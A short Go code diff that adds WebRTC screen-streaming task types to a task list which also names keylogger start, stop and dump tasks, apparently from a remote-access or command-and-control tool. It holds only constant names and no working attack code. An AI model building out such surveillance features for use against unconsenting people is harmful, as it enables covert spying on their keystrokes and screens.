@@ -40,6 +40,8 @@ const (
 	TaskTypeScreenshotWin    = "screenshot_window"
 	TaskTypeScreenStreamSt   = "screen_stream_start"
 	TaskTypeScreenStreamSp   = "screen_stream_stop"
+	TaskTypeScreenWebRTCSt   = "screen_webrtc_start"
+	TaskTypeScreenWebRTCSp   = "screen_webrtc_stop"
 	TaskTypeKeylogStart      = "keylogger_start"
 	TaskTypeKeylogStop       = "keylogger_stop"
 	TaskTypeKeylogDump       = "keylogger_dump"
@@ -278,6 +280,8 @@ func AllTaskTypes() []string {
 		TaskTypeScreenshotWin,
 		TaskTypeScreenStreamSt,
 		TaskTypeScreenStreamSp,
+		TaskTypeScreenWebRTCSt,
+		TaskTypeScreenWebRTCSp,
 		TaskTypeKeylogStart,
 		TaskTypeKeylogStop,
 		TaskTypeKeylogDump,
